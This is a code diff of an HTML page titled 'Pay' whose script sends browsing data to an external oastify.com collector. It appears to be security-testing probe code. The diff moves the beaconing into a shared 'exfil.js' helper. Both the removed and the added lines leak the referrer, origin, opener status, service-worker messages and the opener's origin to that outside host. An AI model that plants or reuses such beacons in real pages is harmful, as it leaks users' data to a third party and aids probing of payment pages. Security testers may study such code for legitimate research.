@@ -2,30 +2,26 @@
   <html>
   <head><title>Pay</title></head>
   <body>
+  <script src="shared/exfil.js"></script>
   <script>
-  const OOB = 'https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com';
-  const log = d => new Image().src = OOB + '/handler?' + new URLSearchParams(
-    typeof d === 'string' ? {m: d} : d
-  ).toString();
+  var exfil = Exfil.create('https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com');
 
-  log({
+  exfil.beaconParams({
     loaded: 1,
     ref: document.referrer,
     opener: window.opener ? 'yes' : 'no',
     origin: location.origin
   });
 
-  // Receive data from SW
-  navigator.serviceWorker.addEventListener('message', e => {
-    log({src: 'sw_msg', d: JSON.stringify(e.data)});
+  navigator.serviceWorker.addEventListener('message', function(e) {
+    exfil.beaconParams({src: 'sw_msg', d: JSON.stringify(e.data)});
   });
 
-  // If opened as a popup, try to read opener
   if (window.opener) {
     try {
-      log({opener_origin: window.opener.location.origin});
+      exfil.beaconParams({opener_origin: window.opener.location.origin});
     } catch(e) {
-      log({opener_origin: 'cross-origin: ' + e.message});
+      exfil.beaconParams({opener_origin: 'cross-origin: ' + e.message});
     }
   }
   </script>
